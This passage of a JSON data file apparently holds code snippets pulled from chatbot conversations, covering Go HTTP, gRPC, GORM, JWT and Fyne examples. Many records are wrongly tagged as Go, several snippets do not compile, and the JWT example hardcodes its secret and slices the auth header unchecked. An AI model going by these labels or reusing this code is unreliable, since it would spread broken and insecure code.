    "code": "type assetQueryBuilder struct {\n\tqueryScope *gorm.DB\n}\n\nfunc (q *assetQueryBuilder) withClientID(id int) *assetQueryBuilder {\n\tq.queryScope = q.queryScope.Where(\"client_id = ?\", id)\n\treturn q\n}\n\nfunc (q *assetQueryBuilder) withAssetTypes(types []string) *assetQueryBuilder {\n\tq.queryScope = q.queryScope.Where(\"asset_type in ?\", types)\n\treturn q\n}\n\nfunc (q *assetQueryBuilder) withFuelTypes(types []string) *assetQueryBuilder {\n\tq.queryScope = q.queryScope.Where(\"fuel_type in ?\", types)\n\treturn q\n}\n\nfunc (q *assetQueryBuilder) withExcludeIds(ids []int) *assetQueryBuilder {\n\tq.queryScope = q.queryScope.Where(\"id not in ?\", ids)\n\treturn q\n}\n\nfunc newAssetQueryBuilder(db *gorm.DB) *assetQueryBuilder {\n\treturn &assetQueryBuilder{\n\t\tqueryScope: db.WithContext(ctx).Model(AssetEntity{}),\n\t}\n}\n\nfunc (a Asset) ListAssets(ctx context.Context, req service.ListAssetsRequest) (service.ListAssetsResponse, error) {\n\tvar as []AssetEntity\n\n\tqueryBuilder := newAssetQueryBuilder(a.db)\n\n\tif req.Pagination != nil {\n\t\tqueryBuilder.queryScope = queryBuilder.queryScope.Scopes(scopes.Paginate(req.Pagination))\n\t}\n\n\tif req.WithDeleted {\n\t\tqueryBuilder.queryScope = queryBuilder.queryScope.Unscoped()\n\t} else {\n\t\tqueryBuilder.queryScope = queryBuilder.queryScope.Where(\"deleted_at is null\")\n\t}\n\n\tif req.IsDisable != nil {\n\t\tqueryBuilder.queryScope = queryBuilder.queryScope.Where(\"is_disable = ?\", req.IsDisable)\n\t}\n\n\tif len(req.AssetTypes) > 0 {\n\t\tqueryBuilder = queryBuilder.withAssetTypes(req.AssetTypes)\n\t}\n\n\tif len(req.FuelTypes) > 0 {\n\t\tqueryBuilder = queryBuilder.withFuelTypes(req.FuelTypes)\n\t}\n\n\tif len(req.ExcludeIds) > 0 {\n\t\tqueryBuilder = queryBuilder.withExcludeIds(req.ExcludeIds)\n\t}\n\n\terr := queryBuilder.queryScope.Find(&as).Error\n\tif err != nil {\n\t\treturn service.ListAssetsResponse{}, errors.WithStack(err)\n\t}\n\n\treturn toSvcListAssetsResponse(as, req.Pagination), nil\n}",
    "filename": "1e4e6912a8f682051e7685d61c6dc4bf_0.go"
  },
  {
    "conversation_hash": "1b0e76982d65115613743885be9defae",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "interface IProduct {\n    _id: string,\n    name: string,\n    model: string,\n    image: string,\n    description: string,\n    price: {\n        single: number,\n        loyalty: number,\n    },\n    categories: string[] | [],\n    similar: string[] | []\n}",
    "filename": "1b0e76982d65115613743885be9defae_0.go"
  },
  {
    "conversation_hash": "394e886fbe349c5fc8702c7d3912308d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"bytes\"\n    \"net/http\"\n)\n\nfunc sendPostRequest() {\n    // Запрос\n    url := \"http://example.com/api/\"\n    postData := []byte(`{\"name\": \"John\", \"age\": 30}`)\n    req, err := http.NewRequest(\"POST\", url, bytes.NewBuffer(postData))\n    if err != nil {\n        panic(err)\n    }\n    \n    // Отправка запроса\n    client := &http.Client{}\n    resp, err := client.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    \n    // Проверка статуса ответа\n    if resp.StatusCode == 200 {\n        // Обработка успешного ответа\n    } else {\n        // Обработка ошибочного ответа\n    }\n}",
    "filename": "394e886fbe349c5fc8702c7d3912308d_0.go"
  },
  {
    "conversation_hash": "45399e3bc030aa0c6fcb3b673de1c9e7",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\t\"google.golang.org/grpc/reflection\"\n\tpb \"path/to/example\" // путь к сгенерированному коду на GoLang\n)\n\ntype server struct {}\n\nfunc (s *server) Greet(ctx context.Context, req *pb.HelloRequest) (*pb.HelloResponse, error) {\n\treturn &pb.HelloResponse {\n\t\tMessage: fmt.Sprintf(\"Hello, %s!\", req.Name),\n\t}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", \":50051\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\treflection.Register(s)\n\n\tfmt.Println(\"Server started\")\n\n\tif err := s.Serve(lis); err != nil {\n\t\tpanic(err)\n\t}\n}",
    "filename": "45399e3bc030aa0c6fcb3b673de1c9e7_2.go"
  },
  {
    "conversation_hash": "45399e3bc030aa0c6fcb3b673de1c9e7",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"path/to/example\" // путь к сгенерированному коду на GoLang\n)\n\nfunc main() {\n\tconn, err := grpc.Dial(\":50051\", grpc.WithInsecure())\n\tdefer conn.Close()\n\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to dial: %v\", err)\n\t}\n\n\tclient := pb.NewGreeterClient(conn)\n\n\tresp, err := client.Greet(context.Background(), &pb.HelloRequest{Name: \"World\"})\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to call: %v\", err)\n\t}\n\n\tfmt.Println(resp.Message)\n}",
    "filename": "45399e3bc030aa0c6fcb3b673de1c9e7_3.go"
  },
  {
    "conversation_hash": "45399e3bc030aa0c6fcb3b673de1c9e7",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Hello, World!\")\n\t})\n\n\tfmt.Println(\"Server started\")\n\n\tif err := http.ListenAndServe(\":8080\", nil); err != nil {\n\t\tpanic(err)\n\t}\n}",
    "filename": "45399e3bc030aa0c6fcb3b673de1c9e7_4.go"
  },
  {
    "conversation_hash": "45399e3bc030aa0c6fcb3b673de1c9e7",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"io/ioutil\"\n)\n\nfunc main() {\n\turl := \"http://example.com\" // URL сервера для отправки запроса\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\treq.Header.Set(\"Content-Type\", \"application/json\") // установка заголовка запроса\n\n\tclient := http.DefaultClient // создаем клиента HTTP\n\n\tresp, err := client.Do(req) // отправляем запрос и получаем ответ\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body) // читаем тело ответа\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(string(body)) // выводим ответ на экран\n}",
    "filename": "45399e3bc030aa0c6fcb3b673de1c9e7_5.go"
  },
  {
    "conversation_hash": "45399e3bc030aa0c6fcb3b673de1c9e7",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"strings\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tclient := http.DefaultClient\n\n\t\turl := \"http://server2.com\"\n\n\t\treq, err := http.NewRequest(\"GET\", url, nil)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\tresp, err := client.Do(req)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tdefer resp.Body.Close()\n\n\t\tif resp.StatusCode != http.StatusOK {\n\t\t\thttp.Error(w, \"unexpected status code\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tbody, err := ioutil.ReadAll(resp.Body)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\t// отправка запроса на сервер-2\n\t\treq2, err := http.NewRequest(\"POST\", url, strings.NewReader(\"ok\"))\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\treq2.Header.Set(\"Content-Type\", \"text/plain\")\n\n\t\tresp2, err := client.Do(req2)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tdefer resp2.Body.Close()\n\n\t\tif resp2.StatusCode != http.StatusOK {\n\t\t\thttp.Error(w, \"unexpected status code\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\t// отправка ответа клиенту\n\t\tw.Header().Set(\"Content-Type\", \"text/plain\")\n\t\tfmt.Fprintf(w, \"%s\", body)\n\t})\n\n\tfmt.Println(\"Server started\")\n\n\tif err := http.ListenAndServe(\":8080\", nil); err != nil {\n\t\tpanic(err)\n\t}\n}",
    "filename": "45399e3bc030aa0c6fcb3b673de1c9e7_7.go"
  },
  {
    "conversation_hash": "9c6f4d395be8bc4757b5f50670b8d4ae",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n\n\t\"github.com/dgrijalva/jwt-go\"\n\t\"github.com/gin-gonic/gin\"\n)\n\n// Имитация базы данных пользователей\nvar users = map[string]string{\n\t\"user1\": \"pass1\",\n\t\"user2\": \"pass2\",\n\t\"user3\": \"pass3\",\n}\n\n// Функция создания JWT\nfunc createToken(username string) (string, error) {\n\tsecret := []byte(\"your_secret_key_here\")\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{\n\t\t\"username\": username,\n\t\t\"exp\":      time.Now().Add(time.Minute * 30).Unix(),\n\t})\n\ttokenString, err := token.SignedString(secret)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\treturn tokenString, nil\n}\n\n// Функция проверки JWT\nfunc isValidToken(tokenString string) bool {\n\tsecret := []byte(\"your_secret_key_here\")\n\ttoken, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {\n\t\tif _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n\t\t\treturn nil, fmt.Errorf(\"Unexpected signing method: %v\", token.Header[\"alg\"])\n\t\t}\n\t\treturn secret, nil\n\t})\n\tif err != nil {\n\t\treturn false\n\t}\n\tif claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {\n\t\tif username, ok := claims[\"username\"].(string); ok {\n\t\t\tif _, exists := users[username]; exists {\n\t\t\t\treturn true\n\t\t\t}\n\t\t}\n\t}\n\treturn false\n}\n\n// Роут авторизации\nfunc login(c *gin.Context) {\n\tusername := c.PostForm(\"username\")\n\tpassword := c.PostForm(\"password\")\n\tif p, exists := users[username]; exists && p == password {\n\t\ttoken, err := createToken(username)\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\tc.AbortWithStatus(http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t\tc.JSON(http.StatusOK, gin.H{\"token\": token})\n\t} else {\n\t\tc.JSON(http.StatusUnauthorized, gin.H{\"message\": \"Invalid username or password!\"})\n\t}\n}\n\n// Защищенный роут\nfunc protected(c *gin.Context) {\n\ttokenString := c.GetHeader(\"Authorization\")[7:]\n\tif isValidToken(tokenString) {\n\t\tcurrentUser, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {\n\t\t\tif _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n\t\t\t\treturn nil, fmt.Errorf(\"Unexpected signing method: %v\", token.Header[\"alg\"])\n\t\t\t}\n\t\t\treturn []byte(\"your_secret_key_here\"), nil\n\t\t})\n\t\tc.JSON(http.StatusOK, gin.H{\"message\": \"This is a protected resource!\", \"user\": currentUser.Claims.(jwt.MapClaims)[\"username\"]})\n\t} else {\n\t\tc.JSON(http.StatusUnauthorized, gin.H{\"message\": \"Unauthorized access!\"})\n\t}\n}\n\nfunc main() {\n\tr := gin.Default()\n\n\t// Роуты\n\tr.POST(\"/login\", login)\n\tr.GET(\"/protected\", protected)\n\n\tr.Run(\":8080\")\n}",
    "filename": "9c6f4d395be8bc4757b5f50670b8d4ae_3.go"
  },
  {
    "conversation_hash": "475118def38a4a8cfc13c5df2793dc6a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"util\"\n)\n\nfunc main() {\n\tencryptedString := \"ZgBASIZlGwBBNTZhZDQ2MDdiODExY2Q1YTVmMGM4MjlkYjY2NWQ1ZGExNTZhZDQ2MDdiODFjZDVhNWYwYzgyOWRiNjY1ZDVkYTEMMS44LjI0LjU0MTc5BjEuMTIuMrEr/mL7XHKMOtxhzPSK+8fFQ4D3j6+z/bWYsXaWluNYjzUmpAQATU9EUwIAW11BAG9sOz5ubGptOGJrazk+bztvPGo5YmhjPjhsbG8+bz47a29sOz5ubGptOGJrOT5vO288ajliaGM+OGxsbz5vPjtrB25ldGVhc2U=\"\n\tencryptedData, _ := base64.StdEncoding.DecodeString(encryptedString)\n\n\tdecryptedData, _ := util.X19HttpDecrypt(encryptedData)\n\n\tfmt.Println(string(decryptedData))\n}",
    "filename": "475118def38a4a8cfc13c5df2793dc6a_2.go"
  },
  {
    "conversation_hash": "475118def38a4a8cfc13c5df2793dc6a",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/base64\"\n    \"fmt\"\n    \"util\"\n)\n\nfunc main() {\n    encryptedString := \"AASA0j73EQEoM2UxOGFlOWExYmRkYWJmMjYxNzRkODk0MWVkNjE1OWIwMTkwNTEzNgwxLjguMjQuNTQxNzkGMS4xMi4yuAr+YqPQiI3BCrXjZS752e6BGZevcek+0qs57/E2WCVIh3H2BABNT0RTAgBbXSgAaT9rYjs/YztrOD4+Ozg8aGxrbW4+YmNuaz8+bGtvYzhqa2Nqb2tpbAduZXRlYXNl\"\n    encryptedData, _ := base64.StdEncoding.DecodeString(encryptedString)\n\n    decryptedData, _ := util.X19HttpDecrypt(encryptedData)\n\n    decryptedString := string(decryptedData)\n    fmt.Println(decryptedString)\n}",
    "filename": "475118def38a4a8cfc13c5df2793dc6a_4.go"
  },
  {
    "conversation_hash": "f3eb89d9a18c791d62fd298c9c731dc3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type StructA1 struct {\n    Field1 []int\n    Field2 []string\n}\n\ntype StructA2 struct {\n    Field1 []float64\n    Field2 []string\n}\n\ntype StructB struct {\n    Field1 []interface{}\n    Field2 []string\n}\n\nfunc ConvertAtoB(a interface{}) StructB {\n    b := StructB{}\n    switch a.(type) {\n    case StructA1:\n        a1 := a.(StructA1)\n        b.Field2 = a1.Field2\n        for _, val := range a1.Field1 {\n            b.Field1 = append(b.Field1, val)\n        }\n    case StructA2:\n        a2 := a.(StructA2)\n        b.Field2 = a2.Field2\n        for _, val := range a2.Field1 {\n            b.Field1 = append(b.Field1, val)\n        }\n    }\n    return b\n}",
    "filename": "f3eb89d9a18c791d62fd298c9c731dc3_0.go"
  },
  {
    "conversation_hash": "f3eb89d9a18c791d62fd298c9c731dc3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type StructA1 struct {\n    Field1 []int\n    Field2 []string\n}\n\ntype StructA2 struct {\n    Field1 []float64\n    Field2 []string\n}\n\ntype StructB struct {\n    Field1 []T\n    Field2 []string\n}\n\nfunc ConvertAtoB[T any](a interface{}) StructB {\n    b := StructB{}\n    switch a.(type) {\n    case StructA1:\n        a1 := a.(StructA1)\n        b.Field2 = a1.Field2\n        for _, val := range a1.Field1 {\n            b.Field1 = append(b.Field1, val)\n        }\n    case StructA2:\n        a2 := a.(StructA2)\n        b.Field2 = a2.Field2\n        for _, val := range a2.Field1 {\n            b.Field1 = append(b.Field1, val)\n        }\n    }\n    return b\n}",
    "filename": "f3eb89d9a18c791d62fd298c9c731dc3_1.go"
  },
  {
    "conversation_hash": "f3eb89d9a18c791d62fd298c9c731dc3",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "A1",
      "A2"
    ],
    "code": "type StructA1 struct {\n    Field1 []SubStructA1\n    Field2 []string\n}\n\ntype StructA2 struct {\n    Field1 []SubStructA2\n    Field2 []string\n}\n\ntype SubStructA1 struct {\n    Field1 int\n    Field2 string\n}\n\ntype SubStructA2 struct {\n    Field1 float64\n    Field2 string\n}\n\ntype StructB struct {\n    Field1 []SubStructB\n    Field2 []string\n}\n\ntype SubStructB struct {\n    Field1 interface{} // 使用interface{} 类型，它可以包含任意类型的值\n    Field2 string\n}\n\nfunc ConvertAtoB(a interface{}) StructB {\n    b := StructB{}\n    switch a.(type) {\n    case StructA1:\n        a1 := a.(StructA1)\n        b.Field2 = a1.Field2\n        for _, val := range a1.Field1 {\n            sub := SubStructB{}\n            sub.Field1 = ConvertSubAtoB(val)\n            sub.Field2 = \"from A1\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    case StructA2:\n        a2 := a.(StructA2)\n        b.Field2 = a2.Field2\n        for _, val := range a2.Field1 {\n            sub := SubStructB{}\n            sub.Field1 = ConvertSubAtoB(val)\n            sub.Field2 = \"from A2\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    }\n    return b\n}\n\nfunc ConvertSubAtoB(subA interface{}) interface{} {\n    switch subA.(type) {\n    case SubStructA1:\n        subA1 := subA.(SubStructA1)\n        subB := SubStructB{}\n        subB.Field1 = subA1.Field1\n        subB.Field2 = \"from A1\"\n        return subB\n    case SubStructA2:\n        subA2 := subA.(SubStructA2)\n        subB := SubStructB{}\n        subB.Field1 = subA2.Field1\n        subB.Field2 = \"from A2\"\n        return subB\n    }\n    return nil\n}",
    "filename": "f3eb89d9a18c791d62fd298c9c731dc3_2.go"
  },
  {
    "conversation_hash": "f3eb89d9a18c791d62fd298c9c731dc3",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "A1",
      "A2"
    ],
    "code": "type StructA1 struct {\n    Field1 []SubStructA1\n    Field2 []string\n}\n\ntype StructA2 struct {\n    Field1 []SubStructA2\n    Field2 []string\n}\n\ntype SubStructA1 struct {\n    Field1 int\n    Field2 string\n}\n\ntype SubStructA2 struct {\n    Field1 float64\n    Field2 string\n}\n\ntype StructB struct {\n    Field1 []SubStructB[T]\n    Field2 []string\n}\n\ntype SubStructB[T any] struct {\n    Field1 T\n    Field2 string\n}\n\nfunc ConvertAtoB[T any](a interface{}) StructB[T] {\n    b := StructB[T]{}\n    switch a.(type) {\n    case StructA1:\n        a1 := a.(StructA1)\n        b.Field2 = a1.Field2\n        for _, val := range a1.Field1 {\n            sub := SubStructB[T]{}\n            sub.Field1 = ConvertSubA1toB[T](val)\n            sub.Field2 = \"from A1\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    case StructA2:\n        a2 := a.(StructA2)\n        b.Field2 = a2.Field2\n        for _, val := range a2.Field1 {\n            sub := SubStructB[T]{}\n            sub.Field1 = ConvertSubA2toB[T](val)\n            sub.Field2 = \"from A2\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    }\n    return b\n}\n\nfunc ConvertSubA1toB[T any](subA SubStructA1) T {\n    subB := T{}\n    subB.Field1 = subA.Field1\n    subB.Field2 = \"from A1\"\n    return subB\n}\n\nfunc ConvertSubA2toB[T any](subA SubStructA2) T {\n    subB := T{}\n    subB.Field1 = subA.Field1\n    subB.Field2 = \"from A2\"\n    return subB\n}",
    "filename": "f3eb89d9a18c791d62fd298c9c731dc3_3.go"
  },
  {
    "conversation_hash": "f3eb89d9a18c791d62fd298c9c731dc3",
    "code_index": 4,
    "language": "Go",
    "libraries": [
      "A1",
      "A2"
    ],
    "code": "type StructA1 struct {\n    Field1 []SubStructA1\n    Field2 []string\n}\n\ntype StructA2 struct {\n    Field1 []SubStructA2\n    Field2 []string\n}\n\ntype SubStructA1 struct {\n    Field1 int\n    Field2 string\n}\n\ntype SubStructA2 struct {\n    Field1 float64\n    Field2 string\n}\n\ntype StructB[T any] struct {\n    Field1 []SubStructB[T]\n    Field2 []string\n}\n\ntype SubStructB[T any] struct {\n    Field1 T\n    Field2 string\n}\n\nfunc ConvertAtoB[T any](a interface{}) StructB[T] {\n    b := StructB[T]{}\n    switch a.(type) {\n    case StructA1:\n        a1 := a.(StructA1)\n        b.Field2 = a1.Field2\n        for _, val := range a1.Field1 {\n            sub := SubStructB[T]{}\n            sub.Field1 = ConvertSubA1toB[T](val)\n            sub.Field2 = \"from A1\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    case StructA2:\n        a2 := a.(StructA2)\n        b.Field2 = a2.Field2\n        for _, val := range a2.Field1 {\n            sub := SubStructB[T]{}\n            sub.Field1 = ConvertSubA2toB[T](val)\n            sub.Field2 = \"from A2\"\n            b.Field1 = append(b.Field1, sub)\n        }\n    }\n    return b\n}\n\nfunc ConvertSubA1toB[T any](subA SubStructA1) SubStructB[T] {\n    subB := SubStructB[T]{}\n    subB.Field1 = subA\n    subB.Field2 = \"from A1\"\n    return subB\n}\n\nfunc ConvertSubA2toB[T any](subA SubStructA2) SubStructB[T] {\n    subB := SubStructB[T]{}\n    subB.Field1 = subA\n    subB.Field2 = \"from A2\"\n    return subB\n}",
    "filename": "f3eb89d9a18c791d62fd298c9c731dc3_4.go"
  },
  {
    "conversation_hash": "fb8d78d1189360850266b3016702a6cb",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        externalNativeBuild {\n            cmake {\n                cppFlags \"-I<path/to/header/files>\"\n                ...\n                cFlags \"-I<path/to/header/files>\"\n            }\n        }\n    }\n    ...\n}",
    "filename": "fb8d78d1189360850266b3016702a6cb_1.go"
  },
  {
    "conversation_hash": "fb8d78d1189360850266b3016702a6cb",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        externalNativeBuild {\n            cmake {\n                ...\n                nativeLibs \"<path/to/libs/*.so>\"\n                ...\n            }\n        }\n    }\n    ...\n}",
    "filename": "fb8d78d1189360850266b3016702a6cb_2.go"
  },
  {
    "conversation_hash": "fb8d78d1189360850266b3016702a6cb",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    ndkVersion \"23.1.7779620\"\n    ndk {\n        abiFilters \"armeabi-v7a\", \"x86\"\n    }\n}",
    "filename": "fb8d78d1189360850266b3016702a6cb_7.go"
  },
  {
    "conversation_hash": "a165cacd6f66d6679233cb4a512a00ea",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        ndk {\n            abiFilters 'armeabi-v7a', 'x86' // 只保留需要的CPU架构\n        }\n    }\n    ...\n}",
    "filename": "a165cacd6f66d6679233cb4a512a00ea_1.go"
  },
  {
    "conversation_hash": "a165cacd6f66d6679233cb4a512a00ea",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        ndk {\n            moduleName \"myappmodule\"\n            ldLibs \"log\", \"z\", \"m\" // 指定依赖库\n        }\n    }\n}",
    "filename": "a165cacd6f66d6679233cb4a512a00ea_3.go"
  },
  {
    "conversation_hash": "a165cacd6f66d6679233cb4a512a00ea",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"fyne.io/fyne\"\n)\n\nfunc init() {\n\tfyne.GetFyne().Settings().SetStringWithFallback(fyne.FyneCrossCompileFlags, \"-ldflags=-s\")\n}",
    "filename": "a165cacd6f66d6679233cb4a512a00ea_4.go"
  },
  {
    "conversation_hash": "a165cacd6f66d6679233cb4a512a00ea",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fyne.io/fyne\"\n\t\"fyne.io/fyne/app\"\n\t\"fyne.io/fyne/layout\"\n\t\"fyne.io/fyne/widget\"\n)\n\nfunc main() {\n\tmyApp := app.New()\n\tmyWindow := myApp.NewWindow(\"Fyne Components\")\n\n\t// Label\n\tmyLabel := widget.NewLabel(\"Hello Fyne!\")\n\n\t// Button\n\tmyButton := widget.NewButton(\"Click me!\", func() {\n\t\tmyLabel.SetText(\"Button clicked!\")\n\t})\n\n\t// Entry\n\tmyEntry := widget.NewEntry()\n\tmyEntry.SetPlaceHolder(\"Enter some text...\")\n\n\t// Check\n\tmyCheck := widget.NewCheck(\"Check\", func(b bool) {\n\t\tmyLabel.SetText(\"Checkbox value changed!\")\n\t})\n\n\t// Radio\n\tmyRadio := widget.NewRadio([]string{\"Option 1\", \"Option 2\", \"Option 3\"}, func(s string) {\n\t\tmyLabel.SetText(\"Radio selected: \" + s)\n\t})\n\n\t// Select\n\tmySelect := widget.NewSelect([]string{\"Option 1\", \"Option 2\", \"Option 3\"}, func(s string) {\n\t\tmyLabel.SetText(\"Selected: \" + s)\n\t})\n\n\t// Slider\n\tmySlider := widget.NewSlider(0, 10)\n\tmySlider.OnChanged = func(f float64) {\n\t\tmyLabel.SetText(\"Slider value changed: \" + fyne.FloatToString(f))\n\t}\n\n\t// Progress bar\n\tmyProgressBar := widget.NewProgressBar()\n\n\t// Box layout\n\tmyBox := fyne.NewContainerWithLayout(layout.NewHBoxLayout(),\n\t\tmyButton,\n\t\tmyEntry,\n\t\tmyCheck,\n\t\tmyRadio,\n\t\tmySelect,\n\t\tmySlider,\n\t\tmyProgressBar,\n\t)\n\n\t// Grid layout\n\tmyGrid := fyne.NewContainerWithLayout(layout.NewGridLayout(4),\n\t\twidget.NewLabel(\"Column 1, Row 1\"),\n\t\twidget.NewLabel(\"Column 2, Row 1\"),\n\t\twidget.NewLabel(\"Column 3, Row 1\"),\n\t\twidget.NewLabel(\"Column 4, Row 1\"),\n\t\twidget.NewLabel(\"Column 1, Row 2\"),\n\t\twidget.NewLabel(\"Column 2, Row 2\"),\n\t\twidget.NewLabel(\"Column 3, Row 2\"),\n\t\twidget.NewLabel(\"Column 4, Row 2\"),\n\t)\n\n\t// Tab container\n\tmyTabContainer := widget.NewTabContainer(\n\t\twidget.NewTabItem(\"Box\", myBox),\n\t\twidget.NewTabItem(\"Grid\", myGrid),\n\t)\n\n\t// Add components to window\n\tmyWindow.SetContent(\n\t\tfyne.NewContainerWithLayout(layout.NewVBoxLayout(),\n\t\t\tmyLabel,\n\t\t\tmyTabContainer,\n\t\t),\n\t)\n\n\t// Show window\n\tmyWindow.ShowAndRun()\n}",
    "filename": "a165cacd6f66d6679233cb4a512a00ea_5.go"
  },
  {
    "conversation_hash": "f80d7a22c221983f71ea42a2885302ad",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ...\n    defaultConfig {\n        // ...\n        externalNativeBuild {\n            cmake {\n                cppFlags \"\"\n            }\n        }\n    }\n    // ...\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\"\n        }\n    }\n}",
    "filename": "f80d7a22c221983f71ea42a2885302ad_3.go"
  },
  {
    "conversation_hash": "7c7c38e516d462e65649664e36ee5bc8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n  id: int,\n  price: str,\n  qty: str,\n  quoteQty: str,\n  time: int,\n  isBuyerMaker: bool,\n  isBestMatch: bool\n}",
    "filename": "7c7c38e516d462e65649664e36ee5bc8_0.go"
  },
  {
    "conversation_hash": "3a5b291184181130937213ba1d551196",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    sourceSets {\n        main {\n            jniLibs.srcDirs = ['src/main/jniLibs']\n        }\n    }\n    ...\n}",
    "filename": "3a5b291184181130937213ba1d551196_5.go"
  },
  {
    "conversation_hash": "e324466a026481900cd6fb8092e15d73",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func(1, 2, 3, 4, 5)\n# 输出：\n# 1\n# 2\n# 3\n# 4\n# 5",
    "filename": "e324466a026481900cd6fb8092e15d73_1.go"
  },
  {
    "conversation_hash": "e324466a026481900cd6fb8092e15d73",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func(a=1, b=2, c=3, d=4, e=5)\n# 输出：\n# a 1\n# b 2\n# c 3\n# d 4\n# e 5",
    "filename": "e324466a026481900cd6fb8092e15d73_3.go"
  },
  {
    "conversation_hash": "606607e3d5b0292d1113c56737ea27d4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
